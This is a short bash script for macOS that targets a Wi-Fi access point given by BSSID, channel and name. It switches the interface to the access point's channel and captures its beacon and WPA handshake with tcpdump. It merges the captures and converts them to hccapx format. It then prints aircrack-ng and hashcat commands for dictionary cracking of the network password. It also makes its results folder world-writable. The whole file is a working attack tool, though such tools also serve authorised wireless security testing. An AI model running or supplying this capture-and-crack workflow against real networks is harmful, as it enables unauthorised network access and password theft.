#!/usr/bin/bash

# Author: Jonas Sciangula Street

BSSID="$1"
CHANNEL="$2"
BSSNAME="$3"
MONITOR="en0"
DIR_NAME=./results/"$BSSID"_"$BSSNAME"
FILE_NAME="$DIR_NAME"/"$BSSID"__ch"$CHANNEL"

if [ -z "$BSSNAME" ]; then
    echo "MISSING BSSNAME IN ARG 3"
    exit 3
fi

mkdir -p $DIR_NAME && chmod 777 $DIR_NAME

sudo airport -z
sudo airport -c"$CHANNEL"

sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $MONITOR -w "$FILE_NAME".beacon.cap
EXIT_STATUS="$?"

if [ $EXIT_STATUS != "0" ]; then
    echo "UNKNOWN ERROR, LAST EXIT STATUS FROM TCPDUMP WAS $EXIT_STATUS"
    exit 4
fi

sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $MONITOR -w "$FILE_NAME".handshake.cap

mergecap -a -F pcap -w "$FILE_NAME".capture.cap "$FILE_NAME".beacon.cap "$FILE_NAME".handshake.cap

cap2hccapx "$FILE_NAME".capture.cap "$FILE_NAME".capture.hccapx

echo ""
echo "[+] DONE! POSSIBLE OPTIONS"
echo ""
echo aircrack-ng -1 -a 2 -b $BSSID  "$FILE_NAME".capture.cap -w dictFile
echo hashcat -m 2500 "$FILE_NAME".capture.hccapx dictFile
echo ""
